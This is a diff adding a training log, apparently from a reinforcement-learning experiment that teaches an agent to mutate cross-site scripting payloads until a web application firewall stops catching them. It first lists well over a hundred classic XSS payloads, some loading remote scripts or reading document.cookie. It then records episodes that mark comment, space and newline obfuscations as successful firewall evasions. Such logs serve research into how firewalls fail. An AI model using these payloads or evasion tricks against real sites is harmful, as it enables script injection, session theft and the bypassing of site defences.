@@ -1,0 +1,746 @@
+Add xss sample:<script>alert(123);</script>
+Add xss sample:<ScRipT>alert("XSS");</ScRipT>
+Add xss sample:<script>alert(123)</script>
+Add xss sample:<script>alert("hellox worldss");</script>
+Add xss sample:<script>alert(/XSS/)</script>
+Add xss sample:</script><script>alert(1)</script>
+Add xss sample:<ScRiPt>alert(1)</sCriPt>
+Add xss sample:<img src=xss onerror=alert(1)>
+Add xss sample:<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
+Add xss sample:<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+Add xss sample:<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+Add xss sample:http://www.google<script .com>alert(document.location)</script
+Add xss sample:<script ^__^>alert(String.fromCharCode(49))</script ^__^
+Add xss sample:<div/style="width:expression(confirm(1))">X</div> {IE7}
+Add xss sample:/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+Add xss sample://|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+Add xss sample:</plaintext\></|\><plaintext/onmouseover=prompt(1)
+Add xss sample:<var onmouseover="prompt(1)">On Mouse Over</var>
+Add xss sample:<img src="/" =_=" title="onerror='prompt(1)'">
+Add xss sample:<script src="data:text/javascript,alert(1)"></script>
+Add xss sample:<iframe/src \/\/onload = prompt(1)
+Add xss sample:<iframe/onreadystatechange=alert(1)
+Add xss sample:<svg/onload=alert(1)
+Add xss sample:<input value=<><iframe/src=javascript:confirm(1)
+Add xss sample:<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+Add xss sample:http://www.<script>alert(1)</script .com
+Add xss sample:<svg><script ?>alert(1)
+Add xss sample:<img src=`xx:xx`onerror=alert(1)>
+Add xss sample:<math><a xlink:href="//jsfiddle.net/t846h/">click
+Add xss sample:<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
+Add xss sample:<svg contentScriptType=text/vbs><script>MsgBox+1
+Add xss sample:<script>+-+-1-+-+alert(1)</script>
+Add xss sample:<script itworksinallbrowsers>/*<script* */alert(1)</script
+Add xss sample:<img src ?itworksonchrome?\/onerror = alert(1)
+Add xss sample:<svg><script onlypossibleinopera:-)> alert(1)
+Add xss sample:<script x> alert(1) </script 1=2
+Add xss sample:<div/onmouseover='alert(1)'> style="x:">
+Add xss sample:<--`<img/src=` onerror=alert(1)> --!>
+Add xss sample:"><img src=x onerror=window.open('https://www.google.com/');>
+Add xss sample:<math><a xlink:href="//jsfiddle.net/t846h/">click
+Add xss sample:<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+Add xss sample:<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
+Add xss sample:foo<script>alert(1)</script>
+Add xss sample:<scr<script>ipt>alert(1)</scr</script>ipt>
+Add xss sample:<iframe src=http://ha.ckers.org/scriptlet.html <
+Add xss sample:javascript:alert("hellox worldss")
+Add xss sample:<img src="javascript:alert('XSS');">
+Add xss sample:<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+Add xss sample:<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+Add xss sample:<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+Add xss sample:<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+Add xss sample:<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<<SCRIPT>alert("XSS");//<</SCRIPT>
+Add xss sample:<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+Add xss sample:<h1><font color=blue>hellox worldss</h1>
+Add xss sample:<BODY ONLOAD=alert('hellox worldss')>
+Add xss sample:<input onfocus=write(XSS) autofocus>
+Add xss sample:<input onblur=write(XSS) autofocus><input autofocus>
+Add xss sample:<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+Add xss sample:<form><button formaction="javascript:alert(XSS)">lol
+Add xss sample:<!--<img src="--><img src=x onerror=alert(XSS)//">
+Add xss sample:<![><img src="]><img src=x onerror=alert(XSS)//">
+Add xss sample:<style><img src="</style><img src=x onerror=alert(XSS)//">
+Add xss sample:<? foo="><script>alert(1)</script>">
+Add xss sample:<! foo="><script>alert(1)</script>">
+Add xss sample:</ foo="><script>alert(1)</script>">
+Add xss sample:<? foo="><x foo='?><script>alert(1)</script>'>">
+Add xss sample:<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
+Add xss sample:<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
+Add xss sample:\\";alert('XSS');//
+Add xss sample:d=\"alert('XSS');\\")\";
+Add xss sample:';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+Add xss sample:<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+Add xss sample:<IMG SRC="javascript:alert('XSS');">
+Add xss sample:<IMG SRC=javascript:alert('XSS')>
+Add xss sample:<IMG SRC=javascrscriptipt:alert('XSS')>
+Add xss sample:<IMG SRC=JaVaScRiPt:alert('XSS')>
+Add xss sample:<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+Add xss sample:<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<<SCRIPT>alert("XSS");//<</SCRIPT>
+Add xss sample:<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+Add xss sample:\";alert('XSS');//
+Add xss sample:</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+Add xss sample:<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+Add xss sample:<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+Add xss sample:<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+Add xss sample:<TABLE BACKGROUND="javascript:alert('XSS')">
+Add xss sample:<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+Add xss sample:<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+Add xss sample:<DIV STYLE="width: expression(alert('XSS'));">
+Add xss sample:<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+Add xss sample:<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+Add xss sample:<XSS STYLE="xss:expression(alert('XSS'))">
+Add xss sample:<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+Add xss sample:a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+Add xss sample:<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+Add xss sample:<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+Add xss sample:<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+Add xss sample:<form><button formaction="javascript:alert(123)">crosssitespt
+Add xss sample:<frameset onload=alert(123)>
+Add xss sample:<!--<img src="--><img src=x onerror=alert(123)//">
+Add xss sample:<style><img src="</style><img src=x onerror=alert(123)//">
+Add xss sample:<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+Add xss sample:<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+Add xss sample:<embed src="javascript:alert(1)">
+Add xss sample:<? foo="><script>alert(1)</script>">
+Add xss sample:<! foo="><script>alert(1)</script>">
+Add xss sample:</ foo="><script>alert(1)</script>">
+Add xss sample:<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
+Add xss sample:<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+Add xss sample:<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+Add xss sample:+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+Add xss sample:+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+Add xss sample:foo<script>alert(document.cookie)</script>
+Add xss sample:<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+Add xss sample:</script><script >alert(document.cookie)</script>
+Add xss sample:<img src=asdf onerror=alert(document.cookie)>
+Add xss sample:<script>alert(1)</script>
+Add xss sample:"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+Add xss sample:<video src=1 onerror=alert(1)>
+Add xss sample:<audio src=1 onerror=alert(1)>
+reset current_sample=<![><img src="]><img src=x onerror=alert(XSS)//">
+nb_actions:
+4
+env.observation_space.shape:
+(1, 257)
+5
+_________________________________________________________________
+Layer (type)                 Output Shape              Param #   
+=================================================================
+flatten_1 (Flatten)          (None, 257)               0         
+_________________________________________________________________
+dropout_1 (Dropout)          (None, 257)               0         
+_________________________________________________________________
+dense_1 (Dense)              (None, 5)                 1290      
+_________________________________________________________________
+batch_normalization_1 (Batch (None, 5)                 20        
+_________________________________________________________________
+elu_1 (ELU)                  (None, 5)                 0         
+_________________________________________________________________
+dense_2 (Dense)              (None, 4)                 24        
+_________________________________________________________________
+activation_1 (Activation)    (None, 4)                 0         
+=================================================================
+Total params: 1,334
+Trainable params: 1,324
+Non-trainable params: 10
+_________________________________________________________________
+None
+Training for 100 steps ...
+reset current_sample=<--`<img/src=` onerror=alert(1)> --!>
+current sample:<--`<img/src=` onerror=alert(1)> --!>
+action is addComment
+Do action :addComment
+current sample:<--`<img/src=` onerror=a/*8888*/lert(1)> --!>
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<--`<img/src=` on/*8888*/error=a/*8888*/lert(1)> --!>
+  2/100: episode: 1, duration: 0.115s, episode steps: 2, steps per second: 17, episode reward: 10.000, mean reward: 5.000 [0.000, 10.000], mean action: 0.000 [0.000, 0.000], mean observation: 0.195 [0.000, 53.000], loss: --, mean_absolute_error: --, mean_q: --
+reset current_sample=<script>alert(1)</script>
+current sample:<script>alert(1)</script>
+action is addComment
+Do action :addComment
+current sample:<scri/*8888*/pt>alert(1)</scri/*8888*/pt>
+action is addComment
+Do action :addComment
+current sample:<scri/*8888*//*8888*/pt>alert(1)</scri/*8888*//*8888*/pt>
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<scri/*8888*//*8888*/pt>ale/*8888*/rt(1)</scri/*8888*//*8888*/pt>
+  5/100: episode: 2, duration: 0.003s, episode steps: 3, steps per second: 929, episode reward: 10.000, mean reward: 3.333 [0.000, 10.000], mean action: 0.000 [0.000, 0.000], mean observation: 0.215 [0.000, 65.000], loss: --, mean_absolute_error: --, mean_q: --
+reset current_sample=<? foo="><x foo='?><script>alert(1)</script>'>">
+current sample:<? foo="><x foo='?><script>alert(1)</script>'>">
+action is addComment
+Do action :addComment
+current sample:<? fo/*8888*/o/*8888*/="><x fo/*8888*/o/*8888*/='?><script>alert(1)</script>'>">
+action is addComment
+Do action :addComment
+current sample:<? fo/*8888*/o/*8888*/="><x fo/*8888*/o/*8888*/='?><scri/*8888*/pt>alert(1)</scri/*8888*/pt>'>">
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<? fo/*8888*/o/*8888*/="><x fo/*8888*/o/*8888*/='?><scri/*8888*/pt>al/*8888*/ert(1)</scri/*8888*/pt>'>">
+  8/100: episode: 3, duration: 0.005s, episode steps: 3, steps per second: 629, episode reward: 10.000, mean reward: 3.333 [0.000, 10.000], mean action: 0.000 [0.000, 0.000], mean observation: 0.367 [0.000, 104.000], loss: --, mean_absolute_error: --, mean_q: --
+reset current_sample=<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+current sample:<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+action is addComment
+Do action :addComment
+current sample:<IMG STYLE="xss:expr/*XSS*/essio/*8888*/n(alert('XSS'))">
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<IMG STYLE="xss:e/*8888*/xpr/*XSS*/e/*8888*/ssio/*8888*/n(ale/*8888*/rt('XSS'))">
+ 10/100: episode: 4, duration: 0.003s, episode steps: 2, steps per second: 737, episode reward: 10.000, mean reward: 5.000 [0.000, 10.000], mean action: 0.000 [0.000, 0.000], mean observation: 0.272 [0.000, 81.000], loss: --, mean_absolute_error: --, mean_q: --
+reset current_sample=<![><img src="]><img src=x onerror=alert(XSS)//">
+current sample:<![><img src="]><img src=x onerror=alert(XSS)//">
+action is addComment
+Do action :addComment
+current sample:<![><img src="]><img src=x o/*8888*/nerro/*8888*/r=alert(XSS)//">
+action is addComment
+Do action :addComment
+current sample:<![><img src="]><img src=x o/*8888*//*8888*/nerro/*8888*//*8888*/r=alert(XSS)//">
+action is addComment
+Do action :addComment
+current sample:<![><i/*8888*/mg src="]><i/*8888*/mg src=x o/*8888*//*8888*/nerro/*8888*//*8888*/r=alert(XSS)//">
+action is addComment
+Do action :addComment
+current sample:<![><i/*8888*/mg/*8888*/ src="]><i/*8888*/mg/*8888*/ src=x o/*8888*//*8888*/nerro/*8888*//*8888*/r=alert(XSS)//">
+action is addComment
+Do action :addComment
+current sample:<![><i/*8888*//*8888*/mg/*8888*/ src="]><i/*8888*//*8888*/mg/*8888*/ src=x o/*8888*//*8888*/nerro/*8888*//*8888*/r=alert(XSS)//">
+action is addComment
+Do action :addComment
+current sample:<![><i/*8888*//*8888*/mg/*8888*/ src/*8888*/="]><i/*8888*//*8888*/mg/*8888*/ src/*8888*/=x o/*8888*//*8888*/nerro/*8888*//*8888*/r=alert(XSS)//">
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<![><i/*8888*//*8888*/mg/*8888*/ src/*8888*/="]><i/*8888*//*8888*/mg/*8888*/ src/*8888*/=x o/*8888*//*8888*/ne/*8888*/rro/*8888*//*8888*/r=ale/*8888*/rt(XSS)//">
+ 17/100: episode: 5, duration: 1.189s, episode steps: 7, steps per second: 6, episode reward: 10.000, mean reward: 1.429 [0.000, 10.000], mean action: 0.000 [0.000, 0.000], mean observation: 0.444 [0.000, 161.000], loss: --, mean_absolute_error: --, mean_q: --
+reset current_sample=<script>alert(123)</script>
+current sample:<script>alert(123)</script>
+action is addZero
+Do action :addZero
+current sample:<script>al ert(123)</script>
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:<scr ipt>al ert(123)</scr ipt>
+ 19/100: episode: 6, duration: 0.013s, episode steps: 2, steps per second: 158, episode reward: 10.000, mean reward: 5.000 [0.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.117 [0.000, 30.000], loss: 35.960320, mean_absolute_error: 2.291496, mean_q: 0.163432
+reset current_sample=<script>alert(1)</script>
+current sample:<script>alert(1)</script>
+action is addZero
+Do action :addZero
+current sample:<s cript>alert(1)</s cript>
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:<s cript>a lert(1)</s cript>
+ 21/100: episode: 7, duration: 0.011s, episode steps: 2, steps per second: 184, episode reward: 10.000, mean reward: 5.000 [0.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.111 [0.000, 28.000], loss: 26.671333, mean_absolute_error: 2.184959, mean_q: 0.215978
+reset current_sample=<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+current sample:<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:<STYLE>@im\port'\ja\vasc\ript:a lert("XSS")';</STYLE>
+ 22/100: episode: 8, duration: 0.008s, episode steps: 1, steps per second: 127, episode reward: 10.000, mean reward: 10.000 [10.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.210 [0.000, 53.000], loss: 22.505058, mean_absolute_error: 2.017705, mean_q: 0.276149
+reset current_sample=<input onfocus=write(XSS) autofocus>
+current sample:<input onfocus=write(XSS) autofocus>
+action is addZero
+Do action :addZero
+current sample:< input onfocus=wr ite(XSS) autofocus>
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:< input  onf ocus=wr ite(XSS) aut of ocus>
+ 24/100: episode: 9, duration: 0.010s, episode steps: 2, steps per second: 198, episode reward: 10.000, mean reward: 5.000 [0.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.160 [0.000, 42.000], loss: 22.245449, mean_absolute_error: 1.901942, mean_q: 0.276336
+reset current_sample=javascript:alert("hellox worldss")
+current sample:javascript:alert("hellox worldss")
+action is addTab
+Do action :addTab
+current sample:javascript:al   ert("h   ellox worldss")
+action is addZero
+Do action :addZero
+current sample:javascript:al   ert("h   ell ox w orldss")
+action is addZero
+Do action :addZero
+current sample:j av ascript: al   ert("h   ell ox w orldss")
+action is addZero
+Do action :addZero
+current sample:j av ascript: al   ert("h   ell ox w orl dss")
+action is addZero
+Do action :addZero
+current sample:j av ascript: al   ert("h   ell  ox w  orl dss")
+action is addZero
+Do action :addZero
+current sample:j  av  ascript:  al   ert("h   ell  ox w  orl dss")
+action is addZero
+Do action :addZero
+current sample:j   av   ascript:   al   ert("h   ell  ox w  orl dss")
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:j   av   ascri pt:   al   ert("h   ell  ox w  orl dss")
+ 32/100: episode: 10, duration: 0.036s, episode steps: 8, steps per second: 224, episode reward: 10.000, mean reward: 1.250 [0.000, 10.000], mean action: 1.875 [1.000, 2.000], mean observation: 0.189 [0.000, 55.000], loss: 20.094013, mean_absolute_error: 1.824747, mean_q: 0.336565
+reset current_sample=<script>alert(1)</script>
+current sample:<script>alert(1)</script>
+action is addZero
+Do action :addZero
+current sample:<script> alert(1)</script>
+action is addZero
+Do action :addZero
+current sample:<scr ipt> alert(1)</scr ipt>
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:<scr ipt> al ert(1)</scr ipt>
+ 35/100: episode: 11, duration: 0.014s, episode steps: 3, steps per second: 210, episode reward: 10.000, mean reward: 3.333 [0.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.112 [0.000, 29.000], loss: 14.780339, mean_absolute_error: 1.458330, mean_q: 0.308221
+reset current_sample=<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+current sample:<TABLE><TD BACKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T ABLE><TD B ACKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B ACKGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGROUND="javascript:alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGROUND="j av ascript: alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGROUND="j av ascri pt: alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGROUND="j av ascr i pt: alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGROUND="j av ascr i  pt: alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGROUND=" j av ascr i  pt: alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGROUND=" j  av  ascr i  pt:  alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGR OUND=" j  av  ascr i  pt:  alert('XSS')">
+action is addZero
+Do action :addZero
+current sample:<T AB LE><TD B AC KGR OUND=" j   av   ascr i  pt:   alert('XSS')">
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<T AB LE><TD B AC KGR OUND=" j   a/*8888*/v   a/*8888*/scr i  pt:   a/*8888*/lert('XSS')">
+ 47/100: episode: 12, duration: 0.049s, episode steps: 12, steps per second: 246, episode reward: 10.000, mean reward: 0.833 [0.000, 10.000], mean action: 1.833 [0.000, 2.000], mean observation: 0.237 [0.000, 90.000], loss: 12.788100, mean_absolute_error: 1.389074, mean_q: 0.459819
+reset current_sample=<? foo="><script>alert(1)</script>">
+current sample:<? foo="><script>alert(1)</script>">
+action is addZero
+Do action :addZero
+current sample:<? f o o="><script>alert(1)</script>">
+action is addZero
+Do action :addZero
+current sample:<? f  o  o="><script>alert(1)</script>">
+action is addZero
+Do action :addZero
+current sample:<? f  o  o="><scri pt>alert(1)</scri pt>">
+action is addZero
+Do action :addZero
+current sample:<? f   o   o="><scri pt>alert(1)</scri pt>">
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:<? f   o   o="><scri pt>al ert(1)</scri pt>">
+ 52/100: episode: 13, duration: 0.020s, episode steps: 5, steps per second: 249, episode reward: 10.000, mean reward: 2.000 [0.000, 10.000], mean action: 2.000 [2.000, 2.000], mean observation: 0.167 [0.000, 45.000], loss: 14.484426, mean_absolute_error: 1.429428, mean_q: 0.512986
+reset current_sample=<!--<img src="--><img src=x onerror=alert(123)//">
+current sample:<!--<img src="--><img src=x onerror=alert(123)//">
+action is addZero
+Do action :addZero
+current sample:<!--<im g src="--><im g src=x onerror=alert(123)//">
+action is addZero
+Do action :addZero
+current sample:<!--<im g src="--><im g src=x onerror=a lert(123)//">
+action is addZero
+Do action :addZero
+current sample:<!--<i m g src="--><i m g src=x onerror=a lert(123)//">
+action is addZero
+Do action :addZero
+current sample:<!--<i m  g src="--><i m  g src=x onerror=a lert(123)//">
+action is addZero
+Do action :addZero
+current sample:<!--<i m  g sr c="--><i m  g sr c=x onerror=a lert(123)//">
+action is addEnter
+Do action :addEnter
+Good!!!!!!!avoid waf:<!--<i m  g sr c="--><i m  g sr c=x on
+error=a l
+ert(123)//">
+ 58/100: episode: 14, duration: 0.027s, episode steps: 6, steps per second: 226, episode reward: 10.000, mean reward: 1.667 [0.000, 10.000], mean action: 2.167 [2.000, 3.000], mean observation: 0.224 [0.000, 63.000], loss: 13.830388, mean_absolute_error: 1.367438, mean_q: 0.534759
+reset current_sample=<script ^__^>alert(String.fromCharCode(49))</script ^__^
+current sample:<script ^__^>alert(String.fromCharCode(49))</script ^__^
+action is addZero
+Do action :addZero
+current sample:<script ^__^>alert(String.fro mCharCode(49))</script ^__^
+action is addZero
+Do action :addZero
+current sample:<script ^__^>alert(String.fr o mCharC ode(49))</script ^__^
+action is addZero
+Do action :addZero
+current sample:<script ^__^>alert(String.fr o  mCharC ode(49))</script ^__^
+action is addEnter
+Do action :addEnter
+current sample:<script ^__^>
+alert(String.fr o  mCh
+arC ode(49))</script ^__^
+action is addEnter
+Do action :addEnter
+current sample:<script ^__^>
+alert(String.fr o  m
+Ch
+ar
+C ode(49))</script ^__^
+action is addEnter
+Do action :addEnter
+current sample:<script ^__^>
+
+alert(String.fr o  m
+Ch
+
+ar
+C ode(49))</script ^__^
+action is addEnter
+Do action :addEnter
+current sample:<scri
+pt ^__^>
+
+alert(String.fr o  m
+Ch
+
+ar
+C ode(49))</scri
+pt ^__^
+action is addComment
+Do action :addComment
+current sample:<scri/*8888*/
+pt ^__^>
+
+alert(Stri/*8888*/ng.fr o  m
+Ch
+
+ar
+C ode(49))</scri/*8888*/
+pt ^__^
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<scri/*8888*/
+pt ^__^>
+
+a/*8888*/lert(Stri/*8888*/ng.fr o  m
+Ch
+
+a/*8888*/r
+C ode(49))</scri/*8888*/
+pt ^__^
+ 67/100: episode: 15, duration: 0.036s, episode steps: 9, steps per second: 251, episode reward: 10.000, mean reward: 1.111 [0.000, 10.000], mean action: 2.000 [0.000, 3.000], mean observation: 0.294 [0.000, 116.000], loss: 12.509467, mean_absolute_error: 1.338783, mean_q: 0.606821
+reset current_sample=<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+current sample:<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+action is addComment
+Do action :addComment
+current sample:<EMBED SRC="http://ha.cke/*8888*/rs.org/xss.swf" AllowScriptAcce/*8888*/ss="always"></EMBED>
+action is addComment
+Do action :addComment
+current sample:<EMBED SRC="http://ha.cke/*8888*/rs.org/*8888*//xss.swf" AllowScriptAcce/*8888*/ss="always"></EMBED>
+action is addComment
+Do action :addComment
+current sample:<EMBED SRC="http://ha/*8888*/.cke/*8888*/rs.org/*8888*//xss.swf" AllowScriptAcce/*8888*/ss="a/*8888*/lwa/*8888*/ys"></EMBED>
+action is addComment
+Do action :addComment
+current sample:<EMB/*8888*/ED SRC="http://ha/*8888*/.cke/*8888*/rs.org/*8888*//xss.swf" AllowScriptAcce/*8888*/ss="a/*8888*/lwa/*8888*/ys"></EMB/*8888*/ED>
+action is addComment
+Do action :addComment
+current sample:<E/*8888*/MB/*8888*/E/*8888*/D SRC="http://ha/*8888*/.cke/*8888*/rs.org/*8888*//xss.swf" AllowScriptAcce/*8888*/ss="a/*8888*/lwa/*8888*/ys"></E/*8888*/MB/*8888*/E/*8888*/D>
+action is addComment
+Do action :addComment
+current sample:<E/*8888*/MB/*8888*/E/*8888*/D SRC="http://ha/*8888*//*8888*/.cke/*8888*/rs.org/*8888*//xss.swf" AllowScriptAcce/*8888*/ss="a/*8888*//*8888*/lwa/*8888*//*8888*/ys"></E/*8888*/MB/*8888*/E/*8888*/D>
+action is addComment
+Do action :addComment
+current sample:<E/*8888*/MB/*8888*/E/*8888*/D/*8888*/ SRC="http://ha/*8888*//*8888*/.cke/*8888*/rs.org/*8888*//xss.swf" AllowScriptAcce/*8888*/ss="a/*8888*//*8888*/lwa/*8888*//*8888*/ys"></E/*8888*/MB/*8888*/E/*8888*/D/*8888*/>
+action is addComment
+Do action :addComment
+current sample:<E/*8888*/MB/*8888*/E/*8888*/D/*8888*/ SRC="http://ha/*8888*//*8888*/.cke/*8888*/rs.org/*8888*//*8888*//xss.swf" AllowScriptAcce/*8888*/ss="a/*8888*//*8888*/lwa/*8888*//*8888*/ys"></E/*8888*/MB/*8888*/E/*8888*/D/*8888*/>
+action is addComment
+Do action :addComment
+current sample:<E/*8888*/MB/*8888*/E/*8888*/D/*8888*/ SRC="http://ha/*8888*//*8888*/.cke/*8888*/rs.o/*8888*/rg/*8888*//*8888*//xss.swf" Allo/*8888*/wScriptAcce/*8888*/ss="a/*8888*//*8888*/lwa/*8888*//*8888*/ys"></E/*8888*/MB/*8888*/E/*8888*/D/*8888*/>
+action is addComment
+Do action :addComment
+current sample:<E/*8888*/MB/*8888*/E/*8888*/D/*8888*/ SRC="http://ha/*8888*//*8888*/.cke/*8888*/rs.o/*8888*//*8888*/rg/*8888*//*8888*//xss.swf" Allo/*8888*//*8888*/wScriptAcce/*8888*/ss="a/*8888*//*8888*/lwa/*8888*//*8888*/ys"></E/*8888*/MB/*8888*/E/*8888*/D/*8888*/>
+action is addComment
+Do action :addComment
+Good!!!!!!!avoid waf:<E/*8888*/MB/*8888*/E/*8888*/D/*8888*/ SRC="http/*8888*/://ha/*8888*//*8888*/.cke/*8888*/rs.o/*8888*//*8888*/rg/*8888*//*8888*//xss.swf" Allo/*8888*//*8888*/wScrip/*8888*/tAcce/*8888*/ss="a/*8888*//*8888*/lwa/*8888*//*8888*/ys"></E/*8888*/MB/*8888*/E/*8888*/D/*8888*/>
+ 78/100: episode: 16, duration: 0.049s, episode steps: 11, steps per second: 224, episode reward: 10.000, mean reward: 0.909 [0.000, 10.000], mean action: 0.000 [0.000, 0.000], mean observation: 0.716 [0.000, 268.000], loss: 9.815408, mean_absolute_error: 1.252600, mean_q: 0.712371
+reset current_sample=<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+current sample:<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+action is addZero
+Do action :addZero
+current sample:<IFRAME SRC="javascript:al ert('XSS');"></IFRAME>
+action is addZero
+Do action :addZero
+current sample:< IFRAME SRC="javascript:al ert('XSS');"></ IFRAME>
+action is addZero
+Do action :addZero
+Good!!!!!!!avoid waf:< IFRAME SRC="javascr ipt:al ert('XSS');"></ IFRAME>
